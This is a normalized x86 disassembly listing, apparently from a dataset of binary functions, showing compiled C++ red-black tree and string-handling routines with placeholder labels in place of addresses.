mov ecx [ esi ]
cmp [ ecx + 0xd ] 0x0
jne r-xdata
mov [ ecx + 0xc ] 0x1
mov ecx ebx
push esi
mov [ esi + 0xc ] 0x0
call sub_1002a810
mov ecx [ esi + 0x8 ]
mov eax [ ebx ]
mov edi esi
mov esi [ esi + 0x4 ]
cmp edi [ eax + 0x4 ]
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
cmp [ edi + 0xc ] 0x1
jne r-xdata
jmp r-xdata
mov eax [ ecx ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0xc ] 0x1
je r-xdata
mov al [ esi + 0xc ]
mov [ ecx + 0xc ] al
mov [ esi + 0xc ] 0x1
mov eax [ ecx ]
mov ecx ebx
push esi
mov [ eax + 0xc ] 0x1
call sub_1002a870
mov eax [ ecx + 0x8 ]
push ecx
mov [ eax + 0xc ] 0x1
mov [ ecx + 0xc ] 0x0
mov ecx ebx
call sub_1002a810
mov ecx [ esi ]
mov [ ecx + 0xc ] 0x0
mov al [ esi + 0xc ]
mov [ ecx + 0xc ] al
mov [ esi + 0xc ] 0x1
mov eax [ ecx + 0x8 ]
mov ecx ebx
push esi
mov [ eax + 0xc ] 0x1
call sub_1002a810
jmp r-xdata
mov eax [ ecx ]
push ecx
mov [ eax + 0xc ] 0x1
mov [ ecx + 0xc ] 0x0
mov ecx ebx
call sub_1002a870
mov ecx [ esi + 0x8 ]
sub_10032930
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi ecx
push edi
mov ecx [ ebx + 0x10 ]
cmp ecx eax
jb r-xdata
push r--data
call sub_1003c5ec
mov edi [ ebp + 0x14 ]
sub ecx eax
cmp ecx edi
cmovb edi ecx
mov ecx [ esi + 0x10 ]
or eax 0xffffffff
sub eax ecx
cmp eax edi
jbe r-xdata
push r--data
call sub_1003c5be
test edi edi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
lea eax [ ecx + edi ]
mov ecx esi
push 0x0
push eax
mov [ ebp + 0xc ] eax
call sub_10001bb0
test al al
je r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x10
jb r-xdata
mov edx esi
mov edx [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp eax 0x10
jb r-xdata
cmp esi ebx
jne r-xdata
push ecx
push edx
add eax edi
push eax
call sub_1003c640
add esp 0xc
mov ecx [ esi + 0x10 ]
test ecx ecx
je r-xdata
cmp [ ebx + 0x14 ] 0x10
jb r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov ebx [ ebx ]
mov ecx [ esi + 0x14 ]
cmp ecx 0x10
jb r-xdata
add eax edi
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov edx esi
mov edx [ esi ]
jmp r-xdata
push [ ebp + 0xc ]
mov ecx esi
call sub_10001b80
mov eax [ ebp + 0x10 ]
push edi
add eax ebx
push eax
push ecx
call sub_1003dc80
test edi edi
je r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
cmp ecx 0x10
jb r-xdata
push edi
add eax edx
push eax
push ecx
call sub_1003c640
jmp r-xdata
test edi edi
je r-xdata
add esp 0xc
sub_10032a40
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi ecx
test edi edi
je r-xdata
mov ecx [ esi + 0x10 ]
or eax 0xffffffff
push ebx
mov ebx [ ebp + 0x10 ]
sub eax ecx
cmp eax ebx
jbe r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx 0x10
jb r-xdata
push r--data
call sub_1003c5be
test ebx ebx
je r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
pop ebx
pop edi
mov eax esi
pop esi
pop ebp
retn 0xc
lea eax [ ecx + ebx ]
mov ecx esi
push 0x0
push eax
mov [ ebp + 0x10 ] eax
call sub_10001bb0
test al al
je r-xdata
cmp ecx 0x10
jb r-xdata
cmp edi eax
jb r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x10
jb r-xdata
mov edx esi
mov edx [ esi ]
jmp r-xdata
mov edx esi
mov edx [ esi ]
jmp r-xdata
cmp ecx 0x10
jb r-xdata
mov eax [ esi + 0x10 ]
add eax edx
cmp eax edi
jbe r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp eax 0x10
jb r-xdata
push [ ebp + 0x10 ]
mov eax esi
sub edi eax
push edi
push esi
push ecx
mov ecx esi
call sub_10032930
pop edi
pop esi
pop ebp
retn 0xc
push [ ebp + 0x10 ]
mov eax [ esi ]
sub edi eax
push edi
push esi
push ecx
mov ecx esi
call sub_10032930
pop edi
pop esi
pop ebp
retn 0xc
cmp [ esi + 0x14 ] 0x10
jb r-xdata
push ecx
push edx
add eax ebx
push eax
call sub_1003c640
add esp 0xc
mov ecx [ esi + 0x10 ]
test ecx ecx
je r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
push [ ebp + 0x10 ]
mov ecx esi
call sub_10001b80
push ebx
push edi
push eax
call sub_1003dc80
add esp 0xc
test ebx ebx
je r-xdata
sub_10032b40
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x10 ]
mov [ ebp - 0x4 ] ecx
test esi esi
jne r-xdata
push ebx
push edi
mov edi [ ecx + 0x10 ]
cmp edx edi
jae r-xdata
cmp edx [ ecx + 0x10 ]
ja r-xdata
pop edi
pop ebx
or eax 0xffffffff
pop esi
mov esp ebp
pop ebp
retn 0xc
sub edi edx
cmp esi edi
ja r-xdata
mov eax edx
pop esi
mov esp ebp
pop ebp
retn 0xc
mov eax 0x1
sub eax esi
add edi eax
cmp [ ecx + 0x14 ] 0x10
jb r-xdata
mov eax ecx
mov eax [ ecx ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
push edi
movsx eax [ eax ]
push eax
push ecx
call sub_1003d810
mov ebx eax
add esp 0xc
test ebx ebx
je r-xdata
lea ecx [ eax + edx ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x10
jb r-xdata
mov ecx [ ebp + 0x10 ]
mov edx ebx
mov esi [ ebp + 0x8 ]
sub ecx 0x4
jb r-xdata
sub ebx eax
pop edi
mov eax ebx
pop ebx
pop esi
mov esp ebp
pop ebp
retn 0xc
mov eax [ eax ]
cmp ecx 0xfffffffc
je r-xdata
mov eax [ edx ]
cmp eax [ esi ]
jne r-xdata
mov al [ edx ]
cmp al [ esi ]
jne r-xdata
add edx 0x4
add esi 0x4
sub ecx 0x4
jae r-xdata
mov ecx [ ebp + 0xc ]
mov esi [ ebp + 0x10 ]
sub ecx ebx
dec ecx
add edi ecx
lea ecx [ ebx + 0x1 ]
jmp r-xdata
cmp ecx 0xfffffffd
je r-xdata
mov [ ebp + 0xc ] ecx
test edi edi
je r-xdata
mov al [ edx + 0x1 ]
cmp al [ esi + 0x1 ]
jne r-xdata
cmp ecx 0xfffffffe
je r-xdata
mov al [ edx + 0x2 ]
cmp al [ esi + 0x2 ]
jne r-xdata
cmp ecx 0xffffffff
je r-xdata
mov al [ edx + 0x3 ]
cmp al [ esi + 0x3 ]
je r-xdata
sub_10032c40
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
push esi
push edi
cmp [ edx + 0x14 ] 0x10
mov esi [ edx + 0x10 ]
jb r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x14 ] 0x10
mov edi [ ecx + 0x10 ]
jb r-xdata
mov edx [ edx ]
cmp edi esi
mov eax esi
cmovb eax edi
push eax
call sub_10030db0
add esp 0x4
test eax eax
jne r-xdata
mov ecx [ ecx ]
pop edi
sets al
pop esi
pop ebp
retn 0x8
cmp edi esi
jae r-xdata
xor eax eax
cmp edi esi
setne al
test eax eax
or eax 0xffffffff
test eax eax
pop edi
sets al
pop esi
pop ebp
retn 0x8
sub_10032ca0
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
push esi
mov esi ecx
mov ecx [ esi ]
cmp eax [ ecx ]
jne r-xdata
cmp eax edx
je r-xdata
cmp edx ecx
jne r-xdata
mov ecx [ ebp + 0x8 ]
pop esi
mov [ ecx ] eax
mov eax ecx
mov esp ebp
pop ebp
retn 0xc
lea ebx [ ebx ]
push [ ecx + 0x4 ]
mov ecx esi
call sub_100331b0
mov eax [ esi ]
mov [ eax + 0x4 ] eax
mov eax [ esi ]
mov [ eax ] eax
mov eax [ esi ]
mov [ eax + 0x8 ] eax
mov eax [ esi ]
mov [ esi + 0x4 ] 0x0
pop esi
mov ecx [ eax ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov esp ebp
pop ebp
retn 0xc
push ecx
lea eax [ ebp - 0x4 ]
mov ecx esi
push eax
call sub_10032f00
mov eax [ ebp + 0xc ]
cmp eax [ ebp + 0x10 ]
jne r-xdata
mov edx [ eax + 0x8 ]
cmp [ edx + 0xd ] 0x0
jne r-xdata
cmp [ eax + 0xd ] 0x0
mov ecx eax
jne r-xdata
mov edx [ eax + 0x4 ]
cmp [ edx + 0xd ] 0x0
jne r-xdata
mov eax [ edx ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov [ ebp + 0xc ] edx
cmp eax [ edx + 0x8 ]
jne r-xdata
lea esp [ esp ]
mov eax edx
mov [ ebp + 0xc ] eax
mov edx [ edx + 0x4 ]
cmp [ edx + 0xd ] 0x0
je r-xdata
mov edx eax
mov eax [ edx ]
cmp [ eax + 0xd ] 0x0
je r-xdata
jmp r-xdata
sub_10032d60
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
push esi
mov esi ecx
mov ecx [ esi ]
cmp eax [ ecx ]
jne r-xdata
cmp eax edx
je r-xdata
cmp edx ecx
jne r-xdata
mov ecx [ ebp + 0x8 ]
pop esi
mov [ ecx ] eax
mov eax ecx
mov esp ebp
pop ebp
retn 0xc
lea ebx [ ebx ]
push [ ecx + 0x4 ]
mov ecx esi
call sub_10033210
mov eax [ esi ]
mov [ eax + 0x4 ] eax
mov eax [ esi ]
mov [ eax ] eax
mov eax [ esi ]
mov [ eax + 0x8 ] eax
mov eax [ esi ]
mov [ esi + 0x4 ] 0x0
pop esi
mov ecx [ eax ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov esp ebp
pop ebp
retn 0xc
push ecx
lea eax [ ebp - 0x4 ]
mov ecx esi
push eax
call sub_10032640
mov eax [ ebp + 0xc ]
cmp eax [ ebp + 0x10 ]
jne r-xdata
mov edx [ eax + 0x8 ]
cmp [ edx + 0xd ] 0x0
jne r-xdata
cmp [ eax + 0xd ] 0x0
mov ecx eax
jne r-xdata
mov edx [ eax + 0x4 ]
cmp [ edx + 0xd ] 0x0
jne r-xdata
mov eax [ edx ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov [ ebp + 0xc ] edx
cmp eax [ edx + 0x8 ]
jne r-xdata
lea esp [ esp ]
mov eax edx
mov [ ebp + 0xc ] eax
mov edx [ edx + 0x4 ]
cmp [ edx + 0xd ] 0x0
je r-xdata
mov edx eax
mov eax [ edx ]
cmp [ eax + 0xd ] 0x0
je r-xdata
jmp r-xdata
sub_10032e20
push ebp
mov ebp esp
sub esp 0x8
push ebx
mov ebx [ ecx ]
push edi
mov [ ebp - 0x8 ] ebx
mov edi [ ebx + 0x4 ]
cmp [ edi + 0xd ] 0x0
jne r-xdata
pop edi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp + 0x8 ]
push esi
mov ecx [ edx + 0x10 ]
mov [ ebp - 0x4 ] ecx
mov esi edx
mov esi [ edx ]
jmp r-xdata
cmp ebx ecx
mov edx ecx
cmovb edx ebx
test edx edx
je r-xdata
mov eax [ eax ]
cmp [ eax + 0x14 ] 0x10
mov ebx [ eax + 0x10 ]
jb r-xdata
cmp ebx ecx
jb r-xdata
sub edx 0x4
jb r-xdata
mov edi [ edi + 0x8 ]
mov ebx [ ebp - 0x8 ]
xor eax eax
cmp ebx ecx
setne al
test eax eax
cmp edx 0xfffffffc
je r-xdata
mov edi edi
cmp [ edx + 0x14 ] 0x10
lea eax [ edi + 0x10 ]
jb r-xdata
pop esi
mov ebx edi
mov edi [ edi ]
mov [ ebp - 0x8 ] ebx
jmp r-xdata
xor eax eax
mov cl [ eax ]
cmp cl [ esi ]
jne r-xdata
add eax 0x4
add esi 0x4
sub edx 0x4
jae r-xdata
cmp [ edi + 0xd ] 0x0
mov edx [ ebp + 0x8 ]
je r-xdata
js r-xdata
sbb eax eax
or eax 0x1
jmp r-xdata
cmp edx 0xfffffffd
je r-xdata
mov ecx [ eax ]
cmp ecx [ esi ]
jne r-xdata
mov ecx [ ebp - 0x4 ]
test eax eax
jne r-xdata
mov cl [ eax + 0x1 ]
cmp cl [ esi + 0x1 ]
jne r-xdata
cmp edx 0xfffffffe
je r-xdata
mov cl [ eax + 0x2 ]
cmp cl [ esi + 0x2 ]
jne r-xdata
cmp edx 0xffffffff
je r-xdata
mov al [ eax + 0x3 ]
cmp al [ esi + 0x3 ]
je r-xdata
sub_10032f00
push ebp
mov ebp esp
sub esp 0x8
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov [ ebp - 0x4 ] ecx
lea ecx [ ebp + 0xc ]
push edi
call sub_1002a8d0
mov edx [ ebx ]
cmp [ edx + 0xd ] 0x0
je r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov edi [ ebx + 0x8 ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x8 ] ecx
mov edi [ ecx + 0x8 ]
cmp ecx ebx
jne r-xdata
mov edi edx
jmp r-xdata
cmp [ edi + 0xd ] 0x0
mov esi [ ebx + 0x4 ]
jne r-xdata
mov [ edx + 0x4 ] ecx
mov eax [ ebx ]
mov [ ecx ] eax
cmp ecx [ ebx + 0x8 ]
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx ]
cmp [ eax + 0x4 ] ebx
jne r-xdata
mov [ edi + 0x4 ] esi
cmp [ edi + 0xd ] 0x0
mov esi [ ecx + 0x4 ]
jne r-xdata
mov esi ecx
jmp r-xdata
cmp [ esi ] ebx
jne r-xdata
mov [ eax + 0x4 ] edi
jmp r-xdata
mov [ esi ] edi
mov eax [ ebx + 0x8 ]
mov [ ecx + 0x8 ] eax
mov eax [ ebx + 0x8 ]
mov [ eax + 0x4 ] ecx
mov [ edi + 0x4 ] esi
mov edx [ ebp - 0x4 ]
mov eax [ edx ]
cmp [ eax + 0x4 ] ebx
jne r-xdata
mov [ esi + 0x8 ] edi
mov [ esi ] edi
jmp r-xdata
mov eax [ edx ]
cmp [ eax ] ebx
jne r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax ] ebx
jne r-xdata
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov eax [ edx ]
cmp [ eax + 0x8 ] ebx
jne r-xdata
cmp [ edi + 0xd ] 0x0
je r-xdata
mov [ eax + 0x8 ] ecx
mov [ eax ] ecx
jmp r-xdata
mov eax [ ebx + 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ ecx + 0x4 ] eax
mov al [ ebx + 0xc ]
mov cl [ ecx + 0xc ]
mov [ edx + 0xc ] al
mov edx [ ebp - 0x4 ]
mov [ ebx + 0xc ] cl
cmp [ ebx + 0xc ] 0x1
jne r-xdata
cmp [ edi + 0xd ] 0x0
je r-xdata
mov eax [ edi ]
mov ecx edi
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov ecx esi
jmp r-xdata
mov esi [ ebp - 0x4 ]
mov eax [ edx ]
cmp edi [ eax + 0x4 ]
je r-xdata
mov eax [ edi + 0x8 ]
mov ecx edi
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov ecx esi
mov [ eax + 0x8 ] ecx
jmp r-xdata
mov eax [ edx ]
mov ecx eax
mov eax [ ecx ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov [ eax ] ecx
mov [ ebx + 0x24 ] 0xf
mov [ ebx + 0x20 ] 0x0
push ebx
mov [ ebx + 0x10 ] 0x0
call j_sub_1003f3e3#2
mov eax [ esi + 0x4 ]
add esp 0x4
mov ecx [ ebp + 0xc ]
test eax eax
je r-xdata
push [ ebx + 0x10 ]
call j_sub_1003f3e3#2
add esp 0x4
mov esi [ ebp - 0x4 ]
mov [ edi + 0xc ] 0x1
jmp r-xdata
lea esp [ esp ]
mov eax [ edx ]
mov [ eax + 0x8 ] ecx
jmp r-xdata
mov ecx eax
mov eax [ ecx + 0x8 ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebx
mov [ eax ] ecx
mov esp ebp
pop ebp
retn 0x8
dec eax
mov [ esi + 0x4 ] eax
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov ecx [ esi ]
cmp edi ecx
jne r-xdata
cmp [ ecx + 0xc ] 0x0
jne r-xdata
mov ecx [ esi + 0x8 ]
cmp [ ecx + 0xc ] 0x0
jne r-xdata
cmp [ ecx + 0xd ] 0x0
jne r-xdata
mov [ ecx + 0xc ] 0x1
mov ecx edx
push esi
mov [ esi + 0xc ] 0x0
call sub_1002a870
mov ecx [ esi ]
mov edx [ ebp - 0x4 ]
cmp [ ecx + 0xd ] 0x0
jne r-xdata
mov [ ecx + 0xc ] 0x1
mov ecx edx
push esi
mov [ esi + 0xc ] 0x0
call sub_1002a810
mov ecx [ esi + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ edx ]
mov edi esi
mov esi [ esi + 0x4 ]
cmp edi [ eax + 0x4 ]
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
cmp [ edi + 0xc ] 0x1
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0xc ] 0x1
je r-xdata
mov al [ esi + 0xc ]
mov [ ecx + 0xc ] al
mov [ esi + 0xc ] 0x1
mov eax [ ecx ]
push esi
mov esi [ ebp - 0x4 ]
mov ecx esi
mov [ eax + 0xc ] 0x1
call sub_1002a870
mov [ edi + 0xc ] 0x1
jmp r-xdata
mov eax [ ecx + 0x8 ]
push ecx
mov [ eax + 0xc ] 0x1
mov [ ecx + 0xc ] 0x0
mov ecx edx
call sub_1002a810
mov ecx [ esi ]
mov [ ecx + 0xc ] 0x0
mov al [ esi + 0xc ]
mov [ ecx + 0xc ] al
mov [ esi + 0xc ] 0x1
mov eax [ ecx + 0x8 ]
push esi
mov esi [ ebp - 0x4 ]
mov ecx esi
mov [ eax + 0xc ] 0x1
call sub_1002a810
mov [ edi + 0xc ] 0x1
jmp r-xdata
mov eax [ ecx ]
push ecx
mov [ eax + 0xc ] 0x1
mov [ ecx + 0xc ] 0x0
mov ecx edx
call sub_1002a870
mov ecx [ esi + 0x8 ]
sub_100331b0
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov ebx ecx
push edi
mov edi esi
cmp [ esi + 0xd ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
push [ edi + 0x8 ]
mov ecx ebx
call sub_100331b0
cmp [ esi + 0x24 ] 0x10
mov edi [ edi ]
jb r-xdata
mov [ esi + 0x24 ] 0xf
mov [ esi + 0x20 ] 0x0
push esi
mov [ esi + 0x10 ] 0x0
call j_sub_1003f3e3#2
add esp 0x4
mov esi edi
cmp [ edi + 0xd ] 0x0
je r-xdata
push [ esi + 0x10 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_10033210
push ebp
mov ebp esp
push 0xffffffff
push sub_100523d3
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax ecx
mov [ ebp - 0x10 ] eax
mov ebx [ ebp + 0x8 ]
mov edi ebx
cmp [ ebx + 0xd ] 0x0
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push [ edi + 0x8 ]
mov ecx eax
call sub_10033210
mov edi [ edi ]
lea esi [ ebx + 0x10 ]
mov [ ebp + 0x8 ] esi
mov [ ebp - 0x4 ] 0x0
cmp [ esi + 0x2c ] 0x10
jb r-xdata
mov [ esi + 0x2c ] 0xf
mov [ esi + 0x28 ] 0x0
mov [ esi + 0x18 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ esi + 0x14 ] 0x10
jb r-xdata
push [ esi + 0x18 ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
push ebx
mov [ esi ] 0x0
call j_sub_1003f3e3#2
mov eax [ ebp - 0x10 ]
add esp 0x4
cmp [ edi + 0xd ] 0x0
mov ebx edi
je r-xdata
push [ esi ]
call j_sub_1003f3e3#2
add esp 0x4
sub_100332e0
push ebp
mov ebp esp
push 0xffffffff
push sub_100523f0
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
push 0x28
call sub_1003cdeb
add esp 0x4
mov esi eax
mov [ ebp - 0x18 ] esi
test esi esi
jne r-xdata
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x14 ]
push eax
push esi
call sub_1002a9d0
lea eax [ ebp - 0x14 ]
push eax
lea eax [ esi + 0x4 ]
push eax
call sub_1002a9d0
lea eax [ ebp - 0x14 ]
push eax
lea eax [ esi + 0x8 ]
push eax
call sub_1002a9d0
mov [ ebp - 0x4 ] 0xffffffff
mov [ esi + 0xc ] 0x101
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_1003c58d
sub_10033390
push ebp
mov ebp esp
push 0xffffffff
push sub_10052410
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
push 0x40
call sub_1003cdeb
add esp 0x4
mov esi eax
mov [ ebp - 0x18 ] esi
test esi esi
jne r-xdata
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x14 ]
push eax
push esi
call sub_1002a9d0
lea eax [ ebp - 0x14 ]
push eax
lea eax [ esi + 0x4 ]
push eax
call sub_1002a9d0
lea eax [ ebp - 0x14 ]
push eax
lea eax [ esi + 0x8 ]
push eax
call sub_1002a9d0
mov [ ebp - 0x4 ] 0xffffffff
mov [ esi + 0xc ] 0x101
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_1003c58d
sub_10033440
push ebp
mov ebp esp
push 0xffffffff
push sub_10052430
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x1c ] ecx
xor dl dl
mov [ ebp - 0x11 ] dl
mov [ ebp - 0x4 ] 0x0
mov ebx [ ecx ]
mov esi [ ebx + 0x4 ]
mov al 0x1
mov [ ebp - 0x15 ] al
mov edi [ ebp + 0x10 ]
mov esi ebx
mov [ ebp + 0x10 ] esi
test al al
je r-xdata
mov ebx esi
lea eax [ esi + 0x10 ]
test dl dl
je r-xdata
push edi
lea eax [ esi + 0x10 ]
push eax
call sub_10032c40
test al al
je r-xdata
mov ecx [ ebp - 0x1c ]
mov eax [ ecx ]
cmp ebx [ eax ]
jne r-xdata
push eax
push edi
call sub_10032c40
push edi
push eax
call sub_10032c40
test al al
sete al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] esi
mov [ eax + 0x4 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
push [ ebp + 0x14 ]
push edi
push ebx
push [ ebp - 0x15 ]
mov ecx [ ebp - 0x1c ]
jmp r-xdata
lea ecx [ ebp + 0x10 ]
call sub_1002ac90
mov esi [ ebp + 0x10 ]
push [ ebp + 0x14 ]
push edi
push ebx
push 0x1
mov esi [ esi + 0x8 ]
mov dl [ ebp - 0x11 ]
jmp r-xdata
mov esi [ esi ]
mov dl [ ebp - 0x11 ]
jmp r-xdata
mov [ ebp - 0x15 ] al
test al al
je r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_10033800
mov ecx [ eax ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov [ eax + 0x4 ] 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ esi + 0xd ] 0x0
jne r-xdata
sub_10033550
push ebp
mov ebp esp
push 0xffffffff
push sub_1005247c
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
call sub_10033ab0
mov edi eax
mov [ ebp - 0x14 ] edi
mov [ edi + 0xc ] 0x0
mov [ ebp - 0x4 ] 0x0
lea esi [ edi + 0x10 ]
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0x1
test esi esi
je r-xdata
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov [ esi + 0x10 ] 0x0
mov [ esi + 0x14 ] 0x0
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov [ esi ] 0x0
mov [ ebp - 0x4 ] 0x3
mov [ ebp - 0x4 ] 0x4
mov [ ebp - 0x4 ] 0x1
mov esi [ esi ]
mov [ eax ] 0x0
push 0xffffffff
push 0x0
push ecx
mov ecx esi
call sub_100018b0
mov [ ebp - 0x4 ] 0x2
add esi 0x18
mov [ esi + 0x10 ] 0x0
mov [ esi + 0x14 ] 0x0
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
cmp [ esi + 0x14 ] 0x10
jb r-xdata
sub_10033660
push ebp
mov ebp esp
push 0xffffffff
push sub_100524a0
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov ebx ecx
mov [ ebp - 0x4 ] 0x0
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebx ]
mov eax [ ebp + 0xc ]
mov edi [ ebp + 0x10 ]
cmp eax [ ecx ]
jne r-xdata
push [ ebp + 0x14 ]
push ecx
push [ ebx ]
cmp eax ecx
jne r-xdata
add eax 0x10
push eax
push edi
call sub_10032c40
test al al
je r-xdata
add eax 0x10
push eax
push edi
call sub_10032c40
test al al
je r-xdata
mov eax [ ecx + 0x8 ]
add eax 0x10
push edi
push eax
call sub_10032c40
test al al
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
push [ ebp + 0x14 ]
push edi
push 0x0
lea eax [ ebp - 0x18 ]
push eax
mov ecx ebx
call sub_10033d60
mov ecx [ eax ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
push [ ebp + 0x14 ]
push ecx
push [ ebp + 0xc ]
jmp r-xdata
push edi
mov eax [ ebp + 0xc ]
add eax 0x10
push eax
call sub_10032c40
test al al
je r-xdata
mov eax [ ebp + 0xc ]
mov [ ebp - 0x14 ] eax
lea ecx [ ebp - 0x14 ]
call sub_1002ac90
push edi
mov esi [ ebp - 0x14 ]
lea eax [ esi + 0x10 ]
push eax
call sub_10032c40
test al al
je r-xdata
push [ ebp + 0x14 ]
push ecx
mov eax [ ebx ]
push [ eax + 0x8 ]
push 0x0
